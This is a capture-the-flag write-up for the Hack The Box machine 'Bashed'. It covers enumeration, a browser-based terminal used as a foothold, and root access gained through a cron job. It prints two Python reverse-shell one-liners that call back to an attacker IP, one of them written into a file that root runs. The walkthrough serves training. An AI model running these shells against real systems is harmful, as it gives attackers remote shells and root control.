https://app.hackthebox.com/machines/Bashed

## Review

- Directory enumeration gives a browser based terminal for initial access.
- Run a python reverse shell to gain user access in Kali.
- Running SUDO permission without a password execute the user "scriptmanager" without specifying a password. 
- The /scripts folder runs .py files as a cronjob as root.
- Create a python file with a reverse shell and root access will be gained.

## Enumeration

Run nmap scan to find for open ports.

![image](https://user-images.githubusercontent.com/93418272/184574697-9f6b6eb8-8dc8-45c7-b4c7-78354488cf37.png)


Port 80 shows us the following.

![image](https://user-images.githubusercontent.com/93418272/184574708-493fbab6-5678-413d-b873-b8e0af121037.png)


Nothing interesting

Run a gobuster scan to find for hidden dirrectories.

![image](https://user-images.githubusercontent.com/93418272/184574715-a47d2ab9-662f-40cd-987e-af85d2898af4.png)


/dev/ gives us the following.

![image](https://user-images.githubusercontent.com/93418272/184574731-94666953-45e8-4273-b95c-844d7cb3b9f4.png)


A browser based linux terminal.

![image](https://user-images.githubusercontent.com/93418272/184574746-33020726-14a1-4c45-835c-29b3ba227d0d.png)


The user arrexel has the user.txt file.

![image](https://user-images.githubusercontent.com/93418272/184574773-54b7f10c-fc51-4322-a4cd-3b16b3dd646a.png)


## Foothold

Use a python reverse shell script to spawn a shell in kali.

''' python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.23",1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' '''

Start a netcat listener .

![image](https://user-images.githubusercontent.com/93418272/184574904-59bf5ebe-fb19-4beb-8932-170d66142391.png)


sudo -l indicates we are able to use sudo on scriptmanager.

![image](https://user-images.githubusercontent.com/93418272/184574914-770ca703-1d51-4a08-8bd0-9da102fa84df.png)


Spawn a python shell and and run sudo on scriptmanager.

![image](https://user-images.githubusercontent.com/93418272/184574924-ff1c73f2-b156-4862-a595-787d25a3389f.png)


Find the scripts folder.

![image](https://user-images.githubusercontent.com/93418272/184574930-a4fe7a65-e871-4613-8ae6-7efaae284770.png)


There is a python script that writes a txt file.

To check if its a cron job , i tried removing the test.txt file but unable to do so. Rename the file and after some time a new test.txt file appears.

![image](https://user-images.githubusercontent.com/93418272/184574953-0e4a65f0-fe62-44ad-848b-a060d71aa8b6.png)


This machine seems to run .py files as a cron job and also done by root.

## Privilege escalation

Let's create a new python script with a reverse shell to our machine.

''' echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.23",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > exploit.py '''

![image](https://user-images.githubusercontent.com/93418272/184574993-87cd6a0e-8057-417f-ac92-ce75b1e60a88.png)


Root shell is gained.

![image](https://user-images.githubusercontent.com/93418272/184575001-a75b7599-7243-44f0-8fd6-66bcb3b1b47f.png)


The final flag is found.

![image](https://user-images.githubusercontent.com/93418272/184575010-7d9c9f52-d0dc-4353-8ed8-a9ff70422fe0.png)
